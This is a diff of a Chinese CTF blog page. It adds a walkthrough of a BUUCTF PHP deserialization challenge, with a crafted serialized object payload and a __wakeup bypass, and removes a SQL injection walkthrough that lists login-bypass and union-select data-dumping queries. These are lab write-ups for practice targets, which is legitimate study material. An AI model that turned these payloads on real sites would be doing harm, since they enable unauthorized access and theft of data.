@@ -169,6 +169,84 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-zip" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/07/zip/" class="article-date">
+  	<time datetime="2021-02-07T05:49:18.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/07/zip/">
+        20-buu练习[极客大挑战 2019]PHP1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2>知识点</h2>
+
+<p><b style="color:pink">1：用dirsearch扫描备份文件</b><br>安装及使用教程参见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43459870/article/details/102521386">https://blog.csdn.net/weixin_43459870/article/details/102521386</a><br><b style="color:pink">2：public、protected与private在序列化时的区别</b></p>
+<ul>
+<li>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。
+</li><li>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。
+</li></ul>
+
+
+<p><b style="color:pink">3：__wakeup()方法绕过</b><br>一个经常被用来出题的函数<br>(CVE-2016-7124)<br>作用：与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</p>
+<h2>题目</h2>
+
+<p>打开靶场，界面如下：<br><img src="/2021/02/07/zip/zip0.png"><br>根据提示，可知他有一个备份网站的习惯，那我们用dirsearch扫描目录：<br>命令：python dirsearch.py -u URL -e extension<br><img src="/2021/02/07/zip/zip3.png"><br>扫描到一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 文件，我们直接在url上输入<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> ，下载该zip文件<br><img src="/2021/02/07/zip/zip2.png"><br><img src="/2021/02/07/zip/zip1.png"><br>index.php包含如下代码:接收参数，进行序列化<br><img src="/2021/02/07/zip/zip4.png"><br>class.php文件源码入下：<br><img src="/2021/02/07/zip/zip5.png"><br>flag.php包含如下代码:<br><img src="/2021/02/07/zip/zip6.png"><br><b>声明一个Name类，包含username,password,且两个变量都是private修饰,整句话都有用。<br>然后根据判断句得知，username必须是admin,password必须是100所以，构造序列化</b></p>
+<ul>
+<li>O是对象，s是字符串，i是数字
+</li><li>因为是private修饰的所以要加%00充当空格
+</li><li>构造:O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+</li><li>payload：url+?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+</li></ul>
+
+<p><img src="/2021/02/07/zip/zip7.png"><br>得到flag！</p>
+<h2>菜鸡求学之路</h2> 
+
+<p>看大佬的payload的时候，很疑惑为什么要写%00Name%00username这样的形式？<br>进行了三种修饰方式的测试:public,protected,private<br>只有public修饰的不用太多的修饰原生态构造就好，而private需要加%00Name%00，<br>protected则需要使用 %00*%00username这样的方式<br>——————<br><b>protected修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip8.png"><br><b>public修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"><br><b>private修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-nizhuansiwei" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -991,111 +1069,6 @@ highlight_file(__FILE__);
 </li></ul>
 <img src="/2021/01/26/clac/clac3.png">
 <br>得到flag！
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-love" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/01/25/love/" class="article-date">
-  	<time datetime="2021-01-25T08:12:19.000Z" itemprop="datePublished">2021-01-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/25/love/">
-        11-buu练习lovesql
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开题目链接。界面如下；<br><img src="/2021/01/25/love/love1.png"><br>尝试使用万能密码：</p>
-<ul>
-<li>用户名：1' or 1=1#
-</li><li>密码：222（任意三个数）
-</li></ul>
-跳转到check.php界面：
-
-<p><img src="/2021/01/25/love/love2.png"></p>
-<p>得到了用户名和密码<br>开始注入<br>在url中输入；</p>
-<ul>
-<li>1./check.php?username=admin' order by 3%23&password=1     存在
-</li><li>2./check.php?username=admin' order by 4%23&password=1     存在
-</li><li>3./check.php?username=admin' order by 3%23&password=1     存在
-</li><li>4./check.php?username=admin' order by 4%23&password=1     报错
-</li></ul>
-注意：由于是在url中输入的内容，所以不能用#，而用它的url编码%23。
-输入4时界面如下：
-
-<p><img src="/2021/01/25/love/love3.png"></p>
-<p>由此可知，有3个字段。用union查询测试注入点（回显点位）：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,3%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love4.png"></p>
-<p>回显点位是2和3，查询数据库名及版本：</p>
-<ul>
-<li>/check.php?username=1' union select 1,database(),version()%23&password=1
-</li></ul>
-可知用户名为：geek
-接下来爆表：
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love6.png"></p>
-<p>爆出geekyser和l0ve1ysq1两个表，我们试一下geekuser这个表：<br>爆字段：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love7.png"></p>
-<p>得到三个字段：id，username，password。<br>爆数据：</p>
-<ul>
-<li>/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
-</li></ul>
-
-<p><img src="/2021/01/25/love/love8.png"></p>
-<p><img src="/2021/01/25/love/love9.png"></p>
-<p>得到flag！<br>被sql支配的一天</p>
-<p><img src="/2021/01/25/love/love10.png"></p>
-
       
     </div>
     
